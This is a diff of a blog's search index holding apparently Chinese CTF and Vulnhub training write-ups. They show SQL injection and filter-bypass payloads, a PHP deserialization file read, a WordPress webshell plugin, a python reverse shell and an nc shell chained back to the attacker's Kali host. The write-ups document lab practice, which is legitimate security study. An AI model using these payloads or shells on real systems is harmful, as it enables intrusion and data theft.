class="variable">$ch</span>, CURLINFO_HTTP_CODE);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$httpCode</span> == <span class="number">404</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">404</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        curl_close(<span class="variable">$ch</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$output</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getBlogContents</span> (<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;get(<span class="keyword">$this</span>-&gt;blog);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isValidBlog</span> (<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$blog</span> = <span class="keyword">$this</span>-&gt;blog;</span><br><span class="line">        <span class="keyword">return</span> preg_match(<span class="string">&quot;/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\/\S*)?$/i&quot;</span>, <span class="variable">$blog</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<p>（这里也说明，blog是有特殊的格式要求的。）</p>
-<p>发现确实存在序列化的过程，注意到 <code>function get($url)</code> 和 <code>public function getBlogContents ()</code> 可以读取文件内容，并且上面已经得到文件路径了，那么猜测flag所在的文件路径为：<code>/var/www/html/flag.php</code>。</p>
-<p>编写如下脚本： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserInfo</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&quot;hdf&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span> = <span class="number">20</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$blog</span> = <span class="string">&quot;file:///var/www/html/flag.php&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> UserInfo;</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
-<p>得到： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:3:&quot;hdf&quot;;s:3:&quot;age&quot;;i:20;s:4:&quot;blog&quot;;s:29:&quot;/var/www/html/flag.php&quot;;&#125;</span><br></pre></td></tr></table></figure></p>
-<p>那么接下来问题就是哪里传入我们构造的序列化后的字符串。</p>
-<h1 id="第二次sql注入">第二次sql注入</h1>
-<p>注意力回到： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?no=-1 union/**/select 1,2,3,4</span><br></pre></td></tr></table></figure></p>
-<p>注意到4个字段顺序：<code>no,username,passwd,data</code> ，猜测分别对应 1，2，3，4。并且 data 字段返回的是一个序列化后的过程。因此，做一个假设：</p>
-<p><strong>后台的工作模式：先用 no 进行第一次查询，然后得到对应的 <code>no,username,passwd,data</code> 信息。接着将 data 字段进行反序列后，获取对应地址的内容。</strong></p>
-<p>因此，将上述序列化后的字符带入得到如下payload： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?no=-1 union/**/select 1,2,3,&#x27;O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:3:&quot;hdf&quot;;s:3:&quot;age&quot;;i:20;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;&#125;&#x27;</span><br></pre></td></tr></table></figure></p>
-<p>查看源码发现： <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321165151.png" /></p>
-<p>点击得到 flag。 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321165208.png" /></p>
-<h1 id="其他注入方法">其他注入方法</h1>
-<p>注意到，获取用户信息的时候得到的是：<code>root@localhost</code>，root权限非常大，因此可以尝试直接读取flag文件。</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?no=-1 union/**/select 1,load_file(&#x27;/var/www/html/flag.php&#x27;),3,4</span><br></pre></td></tr></table></figure>
-<p>查看源码，直接获得 flag <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321165450.png" /></p>
-<h1 id="总结">总结</h1>
-<p>本题考的应该是两次注入的过程，第一次常规，第二次反序列化。不过平常刷题中也要注意用户的权限问题，这里的用户权限我确实没想到。</p>
-]]></content>
-      <categories>
-        <category>CTF</category>
-      </categories>
-      <tags>
-        <tag>sql注入</tag>
-        <tag>反序列化</tag>
       </tags>
   </entry>
   <entry>
@@ -1746,6 +1688,64 @@
       </tags>
   </entry>
   <entry>
+    <title>网鼎杯 2018 Fakebook</title>
+    <url>/2022/03/21/%E7%BD%91%E9%BC%8E%E6%9D%AF%202018%20Fakebook/</url>
+    <content><![CDATA[<p>BUUCTF 网址：https://buuoj.cn/challenges</p>
+<span id="more"></span>
+<h1 id="题目信息">题目信息</h1>
+<p>进入环境，有 <code>login</code> 和 <code>join</code> 两个按钮，先用 admin 弱口令测试了一下，发现登陆失败，就尝试注册一个账号。这里需要注意的是 blog 那一栏应该有特殊的验证，我这里使用 <code>123.blog</code> 成功注册。</p>
+<p>登录成功后发现username可以点击，点击之后 url 出现了一个 no 参数，因此测试一下是否存在 sql 注入。 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321162039.png" /></p>
+<h1 id="第一次sql注入">第一次sql注入</h1>
+<p>先用如下payload测试，发现注入点的闭合方式为空。接下来就是常规的注入过程。 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?no=1=1</span><br><span class="line">?no=1=2</span><br></pre></td></tr></table></figure></p>
+<p>然后 fuzz 以下，发现没有字符被过滤（可能是我的字典太小了）</p>
+<h2 id="获取字段数">获取字段数</h2>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?no=1 order by 4</span><br></pre></td></tr></table></figure>
+<h2 id="测试显示位">测试显示位</h2>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?no=-1 union select 1,2,3,4</span><br></pre></td></tr></table></figure>
+<p>发现这个payload被过滤了。但是空格， 逗号，union，select都没有被过滤。经过多次测试，发现后台应该检测的是<code>union select</code>，那么payload设置为 <code>union/**/select</code> 即可绕过。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?no=-1 union/**/select 1,2,3,4</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321162640.png" /></p>
+<p>上面的信息很丰富：</p>
+<ul>
+<li><strong>Notice</strong>: unserialize(): Error at offset 0 of 1 bytes in <strong>/var/www/html/view.php</strong> on line <strong>31</strong> 存在反序列化</li>
+<li>显示位为 2</li>
+<li>地址为：<strong>/var/www/html/view.php</strong></li>
+</ul>
+<h2 id="常规注入">常规注入</h2>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. ?no=-1 union/**/select 1,database(),3,4</span><br><span class="line">2. ?no=-1 union/**/select 1,user(),3,4</span><br><span class="line">3. ?no=-1 union/**/select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema=database()</span><br><span class="line">4. ?no=-1 union/**/select 1,group_concat(column_name),3,4 from information_schema.columns where table_name=&#x27;users&#x27;</span><br><span class="line">5. ?no=-1 union/**/select 1,no,3,4 from fakebook.users</span><br></pre></td></tr></table></figure>
+<p>获得的结果依次是： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">fakebook</span><br><span class="line">root@localhost</span><br><span class="line">users</span><br><span class="line">no,username,passwd,data,USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS</span><br><span class="line">1</span><br><span class="line">hdf</span><br><span class="line">3c9909afec25354d551dae21590bb26e38d53f2173b8d3dc3eee4c047e7ab1c1eb8b85103e3be7ba613b31bb5c9c36214dc9f14a42fd7a2fdb84856bca5c44c2</span><br><span class="line">O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:3:&quot;hdf&quot;;s:3:&quot;age&quot;;i:123;s:4:&quot;blog&quot;;s:8:&quot;123.blog&quot;;&#125;</span><br></pre></td></tr></table></figure></p>
+<p>接下来就不知道该如何是好了，如果是单纯的 sql 注入，应该会显示出 flag，这明显是信息收集的还不够。</p>
+<h1 id="信息收集">信息收集</h1>
+<p>想到 <code>robots.txt</code> 看一下 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: /user.php.bak</span><br></pre></td></tr></table></figure></p>
+<p>发现存在着备份文件泄露，下载打开得到如下： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserInfo</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$blog</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$age</span>, <span class="variable">$blog</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;age = (<span class="keyword">int</span>)<span class="variable">$age</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;blog = <span class="variable">$blog</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get</span>(<span class="params"><span class="variable">$url</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$ch</span> = curl_init();</span><br><span class="line"></span><br><span class="line">        curl_setopt(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line">        curl_setopt(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">        <span class="variable">$output</span> = curl_exec(<span class="variable">$ch</span>);</span><br><span class="line">        <span class="variable">$httpCode</span> = curl_getinfo(<span class="variable">$ch</span>, CURLINFO_HTTP_CODE);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$httpCode</span> == <span class="number">404</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">404</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        curl_close(<span class="variable">$ch</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$output</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getBlogContents</span> (<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;get(<span class="keyword">$this</span>-&gt;blog);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isValidBlog</span> (<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$blog</span> = <span class="keyword">$this</span>-&gt;blog;</span><br><span class="line">        <span class="keyword">return</span> preg_match(<span class="string">&quot;/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\/\S*)?$/i&quot;</span>, <span class="variable">$blog</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>（这里也说明，blog是有特殊的格式要求的。）</p>
+<p>发现确实存在序列化的过程，注意到 <code>function get($url)</code> 和 <code>public function getBlogContents ()</code> 可以读取文件内容，并且上面已经得到文件路径了，那么猜测flag所在的文件路径为：<code>/var/www/html/flag.php</code>。</p>
+<p>编写如下脚本： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserInfo</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&quot;hdf&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span> = <span class="number">20</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$blog</span> = <span class="string">&quot;file:///var/www/html/flag.php&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> UserInfo;</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>得到： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:3:&quot;hdf&quot;;s:3:&quot;age&quot;;i:20;s:4:&quot;blog&quot;;s:29:&quot;/var/www/html/flag.php&quot;;&#125;</span><br></pre></td></tr></table></figure></p>
+<p>那么接下来问题就是哪里传入我们构造的序列化后的字符串。</p>
+<h1 id="第二次sql注入">第二次sql注入</h1>
+<p>注意力回到： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?no=-1 union/**/select 1,2,3,4</span><br></pre></td></tr></table></figure></p>
+<p>注意到4个字段顺序：<code>no,username,passwd,data</code> ，猜测分别对应 1，2，3，4。并且 data 字段返回的是一个序列化后的过程。因此，做一个假设：</p>
+<p><strong>后台的工作模式：先用 no 进行第一次查询，然后得到对应的 <code>no,username,passwd,data</code> 信息。接着将 data 字段进行反序列后，获取对应地址的内容。</strong></p>
+<p>因此，将上述序列化后的字符带入得到如下payload： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?no=-1 union/**/select 1,2,3,&#x27;O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:3:&quot;hdf&quot;;s:3:&quot;age&quot;;i:20;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;&#125;&#x27;</span><br></pre></td></tr></table></figure></p>
+<p>查看源码发现： <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321165151.png" /></p>
+<p>点击得到 flag。 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321165208.png" /></p>
+<h1 id="其他注入方法">其他注入方法</h1>
+<p>注意到，获取用户信息的时候得到的是：<code>root@localhost</code>，root权限非常大，因此可以尝试直接读取flag文件。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?no=-1 union/**/select 1,load_file(&#x27;/var/www/html/flag.php&#x27;),3,4</span><br></pre></td></tr></table></figure>
+<p>查看源码，直接获得 flag <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321165450.png" /></p>
+<h1 id="总结">总结</h1>
+<p>本题考的应该是两次注入的过程，第一次常规，第二次反序列化。不过平常刷题中也要注意用户的权限问题，这里的用户权限我确实没想到。</p>
+]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
+      <tags>
+        <tag>sql注入</tag>
+        <tag>反序列化</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>网鼎杯 2020 朱雀组 phpweb</title>
     <url>/2022/03/27/%E7%BD%91%E9%BC%8E%E6%9D%AF%202020%20%E6%9C%B1%E9%9B%80%E7%BB%84%20phpweb/</url>
     <content><![CDATA[<p>BUUCTF 网址：<a href="https://buuoj.cn/challenges">https://buuoj.cn/challenges</a></p>
@@ -1783,6 +1783,204 @@
       <tags>
         <tag>PHP</tag>
         <tag>反序列化</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>第4周：Vulnhub AdmX writeup</title>
+    <url>/2022/04/03/%E7%AC%AC4%E5%91%A8%EF%BC%9AVulnhub%20AdmX%20writeup/</url>
+    <content><![CDATA[<p>这是白帽学苑的课程——30周打靶的第4周，该靶机难度中等。</p>
+<span id="more"></span>
+<h1 id="靶机信息">靶机信息</h1>
+<p>靶机地址：<a href="https://download.vulnhub.com/admx/AdmX_new.7z">https://download.vulnhub.com/admx/AdmX_new.7z</a></p>
+<p>难度：Medium</p>
+<p>虚拟机软件：Virtual Box</p>
+<p>目标：取得2个flag，获得root权限</p>
+<p><strong>涉及的攻击方法</strong>：</p>
+<ul>
+<li>主机发现</li>
+<li>端口扫描</li>
+<li>web路径爆破（目录扫描）</li>
+<li>BP自动替换</li>
+<li>密码爆破</li>
+<li>MSF漏洞利用</li>
+<li>Wordpress漏洞利用</li>
+<li>NC反弹shell升级：nc反弹的shell是残缺的，比如缺少文件名补全。这个方法就是获得完整的shell。</li>
+<li>蚁剑上线</li>
+<li>利用MySQL提权</li>
+</ul>
+<h1 id="配置信息">配置信息</h1>
+<p>这里使用NAT模式。配置很简单，只需要在virtual box中的全局设定中添加一张网卡，然后虚拟机选择NAT模式，此时会自动选择刚刚创建的网卡。</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220402214433.png" /></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220402214443.png" /></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220402214459.png" /></p>
+<h1 id="单用户模式">单用户模式</h1>
+<p>本题的虚拟机无法扫描到IP。因此进入单用户模式，修改网卡名称即可。具体可以看<a href="https://mp.weixin.qq.com/s?__biz=MjM5NjI1OTc5Mw==&amp;mid=2652172616&amp;idx=1&amp;sn=f72eaf0db6af6e9ec68e17ed30479852&amp;chksm=bd0ba3f68a7c2ae09cd08de9006e86c417ac27ca3d11f603aa30d14fe402b2b5cb4bc55a5545&amp;scene=126&amp;&amp;sessionid=1648903615#rd">修改网卡</a></p>
+<p><strong>步骤</strong>：</p>
+<p>在启动或者重启，显示virtual box那个界面之后黑屏的时候，按住方向键上，进入如下界面：</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220403204842.png" /></p>
+<p>此时按 e，进入如下界面，找到红框位置：</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220403204947.png" /></p>
+<p>将红框的内容修改为如下：</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220403205050.png" /></p>
+<p>一定要是 rw，否则无法修改配置文件！</p>
+<p>然后按<code>ctrl+x</code>或者F10启动。然后输入<code>ip a</code>查看网卡信息：</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220403205339.png" /></p>
+<p>查看网络配置文件中的网卡名称（该靶机的系统是Ubuntu，因此选第二个）： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># RedHat Linux</span><br><span class="line">vi /etc/network/interfaces</span><br><span class="line"></span><br><span class="line"># UBUNTU</span><br><span class="line">vi /etc/netplan/00-installer-config.yaml</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220403205436.png" /></p>
+<p>将 ens33 修改成功网卡信息中的红框位置的名字。然后保存并退出，重启计算机即可获得IP。</p>
+<h1 id="渗透">渗透</h1>
+<p>kali：10.0.2.4</p>
+<h2 id="主机发现">主机发现</h2>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo nmap -sn 10.0.2.0/24</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220402214748.png" /></p>
+<p>1,2,3其实都不是；4是kali，因此靶机IP为10.0.2.5</p>
+<h2 id="端口扫描">端口扫描</h2>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo nmap -p1-65535 10.0.2.5</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220402215226.png" /></p>
+<p>只开了一个80端口</p>
+<h2 id="端口服务发现">端口服务发现</h2>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo nmap -p80 -sV 10.0.2.5</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220402215338.png" /></p>
+<ol type="1">
+<li>靶机系统是Ubuntu</li>
+<li>80端口上的服务是http</li>
+<li>apache 版本 2.4.13</li>
+</ol>
+<h2 id="访问http服务">访问http服务</h2>
+<p>访问之后发现就是一个apache的页面，没有其他信息，因此直接进行web路径扫描。这里使用新的工具feroxbuster。 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">feroxbuster --url http://10.0.2.5</span><br></pre></td></tr></table></figure></p>
+<p>（注意，如果报错仔细看信息，可能是因为没有字典）</p>
+<p>该工具不自带字典，因此有两种方法：</p>
+<ul>
+<li><code>sudo apt install seclists</code> 安装字典</li>
+<li>自己指定字典</li>
+</ul>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220402222016.png" /></p>
+<p>虽然都是301，但是301是重定向，并不是不存在，因此可以尝试访问。注意到两个东西：</p>
+<ol type="1">
+<li>出现了很多的 wordpress</li>
+<li>还有一个admin，这个可能是后台地址</li>
+</ol>
+<p>我们先访问 wordpress，发现页面过了很久才加载出来。而admin更是直接无法访问。因此，聚焦在 <code>http://10.0.2.5/wordpress/</code> 上，<strong>这里能够加载出页面，但是速度很慢，这是为什么呢？因此尝试抓包看一下</strong>。发现了异常：</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220402222458.png" /></p>
+<p>我们只访问了 10.0.2.5，但是数据包却出现了 192.168.159.145，这并不是该网段的IP，此时想起了前面的301，因此猜测，这是后台重定向到了192那个IP地址。</p>
+<p>查看响应包：</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220402222730.png" /></p>
+<p>发现 192.168.159.145 有20个匹配，这说明后台将重定向的IP地址写死了。不论谁访问10.0.2.5都会被重定向到192.168.159.145，这一看就是内网地址。<strong>因此，接下来的思路就是不让靶机请求192.168.159.145的资源，而是让它请求10.0.2.5的资源</strong>。</p>
+<h2 id="bp自动替换">BP自动替换</h2>
+<p>进入BP修改以下信息：</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220402223246.png" /></p>
+<p>此时刷新页面，成功加载！</p>
+<p>接下来进行web功能点测试，测试之后发现，没有存在可利用的漏洞。忽然想起之前有一个wp-admin目录，尝试访问一下。出现后台登录界面！</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220402223545.png" /></p>
+<h2 id="密码爆破">密码爆破</h2>
+<p>看见登录框，首先尝试一下万能密码，发现行不通。但是在测试过程中发现有时候会提示<code>wrong username</code>，有时候却提示<code>The password you entered for the username **admin** is incorrect.</code>。这说明存在着admin这个用户。并且测试过程中发现可以随便实验，没有次数、时间限制，也没有验证码，因此可以采用密码爆破！</p>
+<p>密码爆破首先得知道用户名，有两个方法：</p>
+<ol type="1">
+<li>根据报错信息</li>
+<li>搜索相关CMS的默认管理员、普通账户</li>
+</ol>
+<p>使用BP进行爆破，这里推荐使用<a href="https://github.com/fuzz-security/SuperWordlist">superwordlist</a>中的MidPwds.txt这个字典。（由于这个字典太多了，kali自带的BP不是pro，爆破速度太慢了，因此我自定义了100个进行演示）</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220403204448.png" /></p>
+<p>可以发现只有adam14的响应包长度与其他的不同，并且设置了许多的cookie，然后重定向到 wp-admin，因此，有理由猜测这就是密码，回到登录界面尝试，发现登录成功！因此，最终发现密码是adam14。（如果提示验证邮箱选择左下角的稍后提醒）</p>
+<h2 id="后台get-shell">后台get shell</h2>
+<p>后台get shell的方式一般有以下三种（本题为例）：</p>
+<ol type="1">
+<li>Media里面的文件上传功能，上传后门</li>
+<li>Appearance里theme模板（PHP文件）的修改</li>
+<li>plugins修改现有的插件的php，或者手动写插件然后上传（上传的webshell要找到路径）</li>
+</ol>
+<h3 id="第一种">第一种</h3>
+<p>不论是否免杀，都无法上传</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220402231623.png" /></p>
+<h3 id="第二种">第二种</h3>
+<p>注意到刚进来后台的时候写着使用的主题是<code>Twenty Twenty-One</code>。</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220402231928.png" /></p>
+<p>发现不可以修改文件。</p>
+<h3 id="第三种">第三种</h3>
+<p>推荐自己写一个插件然后上传。如果没有上传功能，那就修改现有插件。这里有上传功能。</p>
+<p>先查看现有的两个插件的写法，发现有一个共同点，那就是头文件！</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220402232516.png" /></p>
+<p>得包含这些东西</p>
+<p>因此，写一个如下插件： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* Plugin Name: webshell</span></span><br><span class="line"><span class="comment">* Plugin URI: https://hdfzzf.github.io</span></span><br><span class="line"><span class="comment">* Descritption: WP webshell for pentest</span></span><br><span class="line"><span class="comment">* Version: 1.0</span></span><br><span class="line"><span class="comment">* Author: hdfzzf</span></span><br><span class="line"><span class="comment">* Author URI: https://hdfzzf.github.io</span></span><br><span class="line"><span class="comment">* License: https://hdfzzf.github.io</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;shell&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">	system(<span class="variable">$_GET</span>[<span class="string">&#x27;shell&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>（经过测试，如果不写头部信息，插件安装会不成功）</p>
+<p>安装成功后需要激活插件</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220402233227.png" /></p>
+<p>现在需要知道插件上传之后的路径。网络搜索发现该CMS插件的路径是<code>/wordpress/wp-content/plugins/</code>。因此访问<code>10.0.2.5/wordpress/wp-content/plugins/shell.php?shell=id</code></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220402234611.png" /></p>
+<p>成功执行了命令。</p>
+<p>这里可以使用：</p>
+<ol type="1">
+<li>python反弹shell</li>
+<li>nc拿shell</li>
+<li>msf</li>
+</ol>
+<p>kali监听 3333 端口，然后网页输入如下命令： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python3 -c <span class="string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.0.2.4&quot;,3333));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;]);&#x27;</span></span><br></pre></td></tr></table></figure></p>
+<p>也可以通过nc串联：</p>
+<p>kali监听两个端口，然后网页执行下面 命令： <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nc 10.0.2.4 3333|/bin/bash|nc 10.0.2.4 4444</span><br></pre></td></tr></table></figure></p>
+<p>不过这里再介绍一种，那就是msf反弹shell。 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. msfconsole  启动msf</span><br><span class="line">2. search wordpress admin</span><br><span class="line">3. use 2  选择第二个</span><br><span class="line">4. show options</span><br><span class="line">5. 设置参数</span><br><span class="line">6. run</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220402235756.png" /></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220402235736.png" /></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220402235840.png" /></p>
+<p>成功！</p>
+<h2 id="shell升级">shell升级</h2>
